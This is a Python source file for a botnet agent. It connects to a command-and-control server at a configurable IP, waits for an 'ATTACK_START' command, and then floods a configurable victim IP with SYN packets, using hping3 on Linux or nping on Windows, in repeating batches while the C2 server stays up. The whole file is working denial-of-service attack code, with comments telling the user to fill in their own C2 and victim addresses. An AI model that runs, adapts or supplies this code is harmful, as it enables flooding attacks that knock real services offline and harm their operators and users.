import socket
import subprocess
import platform
import time

C2_SERVER = "192.168.50.81"  # Replace with your C2 Server IP
PORT = 9000
VICTIM_IP = "192.168.50.76"  # Replace with the victim's IP
BATCH_SIZE = 50  # Number of packets per batch

def is_c2_active():
    """Check if C2 Server is still running"""
    try:
        test_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        test_socket.settimeout(2)  # Timeout after 2 seconds
        test_socket.connect((C2_SERVER, PORT))
        test_socket.close()
        return True  # C2 is still active
    except:
        return False  # C2 is down

def launch_attack():
    system_os = platform.system()

    if system_os == "Linux":
        print("[+] Detected Linux system. Using hping3 for attack.")
        attack_command = f"hping3 -S --flood -p 80 --count {BATCH_SIZE} {VICTIM_IP}"
    elif system_os == "Windows":
        print("[+] Detected Windows system. Using nping (Nmap) for attack.")
        attack_command = f"nping --tcp -p 80 --flags SYN --rate 10000 --no-capture -c {BATCH_SIZE} {VICTIM_IP}"
    else:
        print("[!] Unsupported OS. Exiting...")
        return

    while True:
        if not is_c2_active():
            print("[!] C2 Server is down. Stopping attack and waiting...")
            break  # Stop attacking if C2 server is down

        try:
            print(f"[+] Sending {BATCH_SIZE} SYN packets to {VICTIM_IP}...")
            subprocess.run(attack_command, shell=True, check=True)
            time.sleep(2)  # Wait before sending the next batch
        except subprocess.CalledProcessError as e:
            print(f"[!] Error executing attack command: {e}")
            break

def connect_to_c2():
    """Continuously try to connect to C2 Server"""
    while True:
        try:
            print(f"[+] Trying to connect to C2 Server at {C2_SERVER}:{PORT}...")
            client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            client.connect((C2_SERVER, PORT))

            command = client.recv(1024).decode().strip()
            print(f"[+] Received command: {command}")

            if command == "ATTACK_START":
                launch_attack()  # Start the attack loop

            client.close()

        except ConnectionRefusedError:
            print("[!] C2 Server is unreachable. Retrying in 5 seconds...")
            time.sleep(5)  # Wait and try again
        except Exception as e:
            print(f"[!] Unexpected error: {e}")
            time.sleep(5)  # Wait and retry

if __name__ == "__main__":
    connect_to_c2()